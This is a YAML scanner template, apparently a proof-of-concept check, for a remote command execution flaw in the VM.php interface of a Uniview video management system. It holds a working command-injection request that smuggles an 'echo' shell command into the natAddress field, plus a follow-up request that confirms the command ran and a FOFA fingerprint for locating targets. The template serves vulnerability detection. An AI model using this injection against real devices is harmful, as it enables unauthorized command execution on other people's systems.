id: zjyushi-spglxt-vm-rce

info:
  name: 浙江宇视视频管理系统VM.php接口存在远程命令执行漏洞
  author: 熊猫也是猫
  severity: critical
  description: |-
    fofa: /Script/Public/Language.js.php
  tags: zjyushi,spglxt,rce
  created: 2025/12/26

set:
  rand_str: randomLowercase(8)
rules:
  r0:
    request:
      method: POST
      path: /Interface/DevManage/VM.php
      body: "cmd=setNatConfig&natAddress=%26echo%20{{rand_str}}%20>{{rand_str}}.txt"
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'"code":1') && 
      response.body.bcontains(b'"success":false') && 
      response.headers["set-cookie"] != ""
    output:
      search: '"Set-Cookie: (?P<cookie>.+)".bsubmatch(response.raw_header)'
      cookie: search["cookie"]
  r1:
    request:
      method: GET
      path: /Interface/DevManage/{{rand_str}}.txt
      headers:
        Cookie: "{{cookie}}"
    expression: |
      response.status == 200 && 
      response.body.bcontains(bytes(rand_str))

expression: r0() && r1()
